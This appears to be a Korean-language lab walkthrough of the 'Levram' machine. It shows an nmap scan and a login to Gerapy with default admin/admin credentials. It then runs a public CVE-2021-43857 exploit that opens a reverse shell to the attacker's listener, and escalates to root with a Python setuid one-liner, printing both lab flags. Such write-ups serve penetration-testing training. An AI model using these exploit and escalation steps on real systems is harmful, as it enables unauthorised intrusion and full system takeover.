## Nmap

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ nnmap 192.168.161.24
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-26 14:13 +0900
Nmap scan report for 192.168.161.24
Host is up (0.067s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
|_http-title: Gerapy
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   65.47 ms 192.168.45.1
2   65.43 ms 192.168.45.254
3   65.53 ms 192.168.251.1
4   65.62 ms 192.168.161.24

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.11 seconds
```

8000 포트 접근 후 로그인 시도`admin/admin`
![[Pasted image 20260626142047.png]]

로그인 성공 후 gerapy v0.9.7 확인
![[Pasted image 20260629092125.png]]

CVE 검색
![[Pasted image 20260629092156.png]]

RCE 취약점 발견 

![[Pasted image 20260629092221.png]]

payload 검색
![[Pasted image 20260629092234.png]]


payload 다운로드
```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ git clone https://github.com/LongWayHomie/CVE-2021-43857.git
Cloning into 'CVE-2021-43857'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 10 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (10/10), 124.07 KiB | 20.68 MiB/s, done.
Resolving deltas: 100% (1/1), done.
```
![[Pasted image 20260629092306.png]]


payload 실행 후 `app` 계정 접근
```bash
┌──(kali㉿kali)-[~/PG/Levram/CVE-2021-43857]
└─$ python cve-2021-43857.py -t 192.168.132.24 -p 8000 -L 192.168.45.156 -P 4444
  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / /
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /
 \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/ \___/____//_/


Exploit for CVE-2021-43857
For: Gerapy < 0.9.8
[*] Resolving URL...
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
[*] Found project: 4leaf
[*] Getting the ID of the project to build the URL
[*] Found ID of the project:  1
[*] Setting up a netcat listener
listening on [any] 4444 ...
[*] Executing reverse shell payload
[*] Watchout for shell! :)
connect to [192.168.45.156] from (UNKNOWN) [192.168.132.24] 53596
bash: cannot set terminal process group (846): Inappropriate ioctl for device
bash: no job control in this shell
app@ubuntu:~/gerapy$ whoami
whoami
app
app@ubuntu:~/gerapy$
```

local.txt 획득
```bash
app@ubuntu:~$ cat local.txt
cat local.txt
6fb5bd58ccdadc78eb9299e4a6dccc25
app@ubuntu:~$ ifconfig
ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.132.24  netmask 255.255.255.0  broadcast 192.168.132.255
        ether 00:50:56:ab:d2:c7  txqueuelen 1000  (Ethernet)
        RX packets 1541  bytes 153139 (153.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1282  bytes 3613201 (3.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 392  bytes 31600 (31.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 392  bytes 31600 (31.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

![[Pasted image 20260629092633.png]]


linpeas.sh 실행하여 python 취약점 발견
![[Pasted image 20260629102405.png]]


root 획득 후 flag 확인

```bash
app@ubuntu:~/gerapy$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
<c 'import os; os.setuid(0); os.system("/bin/bash")'
root@ubuntu:~/gerapy# whoami
whoami
root
root@ubuntu:~/gerapy# cat /root/proof.txt
cat /root/proof.txt
ed363800340058da6500e35c1150c446
```
![[Pasted image 20260629102311.png]]